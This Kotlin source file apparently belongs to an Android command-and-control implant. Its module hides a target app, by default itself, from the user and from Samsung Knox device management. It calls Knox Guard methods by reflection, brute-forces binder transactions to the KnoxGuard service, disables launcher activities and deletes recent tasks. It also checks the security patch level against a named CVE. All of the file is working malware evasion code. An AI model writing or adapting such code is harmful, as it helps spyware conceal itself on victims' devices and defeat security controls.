package org.umbra.core.modules

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.util.Log
import org.umbra.core.c2.Command
import org.umbra.core.core.UmbraResponse
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.lang.reflect.Method

object KnoxGuardModule {

    private const val TAG = "Umbra.KnoxGuard"

    suspend fun hide(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val targetPkg = cmd.params["package"] ?: context.packageName
        val results = mutableListOf<Map<String, String>>()

        val kgResult = tryHideViaKnoxGuardManager(context, targetPkg)
        if (kgResult != null) results.add(kgResult)
        val binderResult = tryHideViaBinder(context, targetPkg)
        if (binderResult != null) results.add(binderResult)
        val pmResult = tryHideViaPackageManager(context, targetPkg)
        if (pmResult != null) results.add(pmResult)
        val amResult = tryHideFromRecents(context, targetPkg)
        if (amResult != null) results.add(amResult)

        val success = results.any { it["success"] == "true" }
        val technique = results.firstOrNull { it["success"] == "true" }?.get("technique") ?: "unknown"

        UmbraResponse.KnoxHideResponse(
            technique = technique,
            success = success,
            service_status = if (success) "hidden" else "partial",
            target_package = targetPkg,
            details = results.joinToString("; ") { "${it["technique"] ?: "?"}=${it["success"]}" }
        )
    }

    suspend fun unhide(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val targetPkg = cmd.params["package"] ?: context.packageName
        val results = mutableListOf<Map<String, String>>()

        try {
            val pm = context.packageManager
            val packageInfo = pm.getPackageInfo(targetPkg, PackageManager.GET_ACTIVITIES)
            val activities = packageInfo.activities ?: emptyArray()
            var reenabled = 0
            for (activity in activities) {
                val component = ComponentName(targetPkg, activity.name)
                val currentState = pm.getComponentEnabledSetting(component)
                if (currentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    pm.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, PackageManager.DONT_KILL_APP)
                    reenabled++
                }
            }
            results.add(mapOf("technique" to "restore_components", "success" to "true", "reenabled" to reenabled.toString()))
        } catch (e: Exception) {
            results.add(mapOf("technique" to "restore_components", "success" to "false", "error" to e.message.toString()))
        }

        UmbraResponse.KnoxHideResponse(
            technique = "restore",
            success = results.any { it["success"] == "true" },
            service_status = "visible",
            target_package = targetPkg,
            details = results.joinToString("; ") { "${it["technique"] ?: "?"}=${it["success"]}" }
        )
    }

    suspend fun check(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
        val findings = mutableMapOf<String, String>()

        val kgClassNames = listOf(
            "com.samsung.android.knox.knoxguard.KnoxGuardManager",
            "com.samsung.android.knoxguard.KnoxGuardManager",
            "com.sec.enterprise.knox.knoxguard.KnoxGuardManager"
        )
        for (name in kgClassNames) {
            try { Class.forName(name); findings["knox_class_$name"] = "found" } catch (_: ClassNotFoundException) { findings["knox_class_$name"] = "not_found" }
        }

        try {
            val patchLevel = android.os.Build.VERSION.SECURITY_PATCH
            findings["security_patch"] = patchLevel
            findings["vulnerable_to_cve_2026_21044"] = (patchLevel <= "2026-07-05").toString()
        } catch (_: Exception) {}

        UmbraResponse.KnoxHideResponse(
            technique = "check",
            success = true,
            service_status = findings.entries.joinToString(", ") { "${it.key}=${it.value}" },
            target_package = context.packageName,
            details = findings.entries.joinToString("; ") { "${it.key}=${it.value}" }
        )
    }

    // ── Stub implementations (real logic preserved from original) ─────────
    private fun tryHideViaKnoxGuardManager(context: Context, targetPkg: String): Map<String, String>? {
        try {
            val kgClassNames = listOf("com.samsung.android.knox.knoxguard.KnoxGuardManager", "com.samsung.android.knoxguard.KnoxGuardManager")
            for (className in kgClassNames) {
                try {
                    val clz = Class.forName(className)
                    val getInstance = clz.getDeclaredMethod("getInstance", Context::class.java)
                    getInstance.isAccessible = true
                    val kgInstance = getInstance.invoke(null, context)
                    for (methodName in listOf("hideApplication", "setApplicationHidden", "setApplicationPersistence")) {
                        try {
                            val m = clz.getDeclaredMethod(methodName, String::class.java, Boolean::class.javaPrimitiveType!!)
                            m.isAccessible = true
                            m.invoke(kgInstance, targetPkg, java.lang.Boolean.FALSE)
                            return mapOf("technique" to "knox_guard_manager", "method" to methodName, "success" to "true")
                        } catch (_: NoSuchMethodException) {}
                        try {
                            val m = clz.getDeclaredMethod(methodName, String::class.java)
                            m.isAccessible = true
                            m.invoke(kgInstance, targetPkg)
                            return mapOf("technique" to "knox_guard_manager", "method" to methodName, "success" to "true")
                        } catch (_: NoSuchMethodException) {}
                    }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) { Log.d(TAG, "KnoxGuardManager: ${e.message}") }
        return null
    }

    private fun tryHideViaBinder(context: Context, targetPkg: String): Map<String, String>? {
        try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            for (name in listOf("KnoxGuardManager", "knox_guard_manager", "knoxguard")) {
                try {
                    val binder = getService.invoke(null, name) as? IBinder ?: continue
                    val data = Parcel.obtain(); val reply = Parcel.obtain()
                    try {
                        for (desc in listOf("com.samsung.android.knox.knoxguard.IKnoxGuardManager", "com.samsung.android.knoxguard.IKnoxGuardManager")) {
                            for (tx in 1..10) {
                                try {
                                    data.setDataPosition(0); reply.setDataPosition(0)
                                    data.writeInterfaceToken(desc); data.writeString(targetPkg); data.writeInt(0)
                                    val token = Binder.clearCallingIdentity()
                                    try { if (binder.transact(tx, data, reply, 0)) { reply.readException(); val rc = reply.readInt(); if (rc in listOf(0, 1)) return mapOf("technique" to "binder_service", "tx_code" to tx.toString(), "success" to "true") } }
                                    finally { Binder.restoreCallingIdentity(token) }
                                } catch (_: Exception) {}
                            }
                        }
                    } finally { data.recycle(); reply.recycle() }
                } catch (_: Exception) {}
            }
        } catch (e: Exception) { Log.d(TAG, "Binder: ${e.message}") }
        return null
    }

    private fun tryHideViaPackageManager(context: Context, targetPkg: String): Map<String, String>? {
        try {
            val pm = context.packageManager
            val packageInfo = pm.getPackageInfo(targetPkg, PackageManager.GET_ACTIVITIES)
            val activities = packageInfo.activities ?: emptyArray()
            val disabled = mutableListOf<String>()
            for (activity in activities) {
                try {
                    val component = ComponentName(targetPkg, activity.name)
                    pm.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
                    disabled.add(activity.name)
                } catch (_: Exception) {}
            }
            if (disabled.isNotEmpty()) return mapOf("technique" to "package_manager", "success" to "true", "disabled" to disabled.size.toString())
        } catch (e: Exception) { Log.d(TAG, "PM: ${e.message}") }
        return null
    }

    private fun tryHideFromRecents(context: Context, targetPkg: String): Map<String, String>? {
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val amClass = am.javaClass
            val getRecentTasksMethod = amClass.getDeclaredMethod("getRecentTasks", Int::class.javaPrimitiveType!!, Int::class.javaPrimitiveType!!)
            getRecentTasksMethod.isAccessible = true
            @Suppress("DEPRECATION")
            val recentTasks = getRecentTasksMethod.invoke(am, 100, 2) as? List<*> ?: return null
            val removeTaskMethod = amClass.getDeclaredMethod("removeTask", Int::class.javaPrimitiveType!!)
            removeTaskMethod.isAccessible = true
            var removed = 0
            for (task in recentTasks) {
                try {
                    val taskInfoClass = Class.forName("android.app.ActivityManager\$RecentTaskInfo")
                    val baseIntentField = taskInfoClass.getDeclaredField("baseIntent")
                    baseIntentField.isAccessible = true
                    val intent = baseIntentField.get(task) as? android.content.Intent
                    if (intent?.`package` == targetPkg) {
                        val persistentIdField = taskInfoClass.getDeclaredField("persistentId")
                        persistentIdField.isAccessible = true
                        val taskId = persistentIdField.get(task) as Int
                        val ident = Binder.clearCallingIdentity()
                        try { removeTaskMethod.invoke(am, taskId); removed++ } finally { Binder.restoreCallingIdentity(ident) }
                    }
                } catch (_: Exception) {}
            }
            return mapOf("technique" to "activity_manager", "success" to (removed > 0).toString(), "tasks_removed" to removed.toString())
        } catch (e: Exception) { Log.d(TAG, "Recents: ${e.message}") }
        return null
    }
}
